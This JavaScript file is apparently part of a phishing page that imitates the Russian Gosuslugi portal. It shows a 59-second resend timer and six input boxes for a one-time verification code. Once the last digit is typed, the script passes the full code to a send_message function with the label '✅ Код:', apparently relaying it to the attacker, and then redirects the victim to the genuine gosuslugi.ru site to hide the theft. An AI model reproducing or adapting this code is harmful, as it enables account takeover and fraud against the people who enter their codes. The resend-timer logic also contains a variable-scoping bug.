var time = 59
var timer = document.getElementById('seconds')

var interval = setInterval(() => {
    if (time > 1) {
        time--
        timer.innerHTML = '00:'+time
        if (time <= 9) {
            timer.innerHTML = '00:0'+time
        }
    }
    else {
        timer.innerHTML = 'Отправить';
        timer.style.color = '#0d4cd3'
        timer.setAttribute('onclick', 'send_code_again()')
    }
}, 1000);


function send_code_again() {
    c1.value = ''
    c2.value = ''
    c3.value = ''
    c4.value = ''
    c5.value = ''
    c6.value = ''

    c1.focus()

    clearInterval(interval)
    time = 59

    timer.innerHTML = '00:59';
    timer.style.color = 'black'
    timer.setAttribute('onclick', '')

    var interval2 = setInterval(() => {
    if (time > 1) {
        time--
        timer.innerHTML = '00:'+time
        if (time <= 9) {
            timer.innerHTML = '00:0'+time
        }
    }
    else {
        timer.innerHTML = 'Отправить';
        timer.style.color = '#0d4cd3'
        timer.setAttribute('onclick', 'send_code_again1()')
    }
}, 1000);
}

function send_code_again1() {
    c1.value = ''
    c2.value = ''
    c3.value = ''
    c4.value = ''
    c5.value = ''
    c6.value = ''

    c1.focus()

    clearInterval(interval2)
    time = 59

    timer.innerHTML = '00:59';
    timer.style.color = 'black'
    timer.setAttribute('onclick', '')

    setInterval(() => {
    if (time > 1) {
        time--
        timer.innerHTML = '00:'+time
        if (time <= 9) {
            timer.innerHTML = '00:0'+time
        }
    }
    else {
        timer.innerHTML = 'Отправить';
        timer.style.color = '#0d4cd3'
        timer.setAttribute('onclick', 'send_code_again()')
    }
}, 1000);
}

var c1 = document.getElementById('c1')
var c2 = document.getElementById('c2')
var c3 = document.getElementById('c3')
var c4 = document.getElementById('c4')
var c5 = document.getElementById('c5')
var c6 = document.getElementById('c6')

c1.focus()

function inp1(event) {
    let inputValue = event.target.value;
    if (inputValue) {
        c2.focus()
    }
}
function inp2(event) {
    let inputValue = event.target.value;
    if (inputValue) {
        c3.focus()
    }
}
function inp3(event) {
    let inputValue = event.target.value;
    if (inputValue) {
        c4.focus()
    }
}
function inp4(event) {
    let inputValue = event.target.value;
    if (inputValue) {
        c5.focus()
    }
}
function inp5(event) {
    let inputValue = event.target.value;
    if (inputValue) {
        c6.focus()
    }
}
function inp6(event) {
    let inputValue = event.target.value;
    if (inputValue) {
        let code = c1.value + c2.value + c3.value + c4.value + c5.value + c6.value
        send_message(`✅ Код: ${code}`)
        window.location.href = 'https://www.gosuslugi.ru/'
    }
}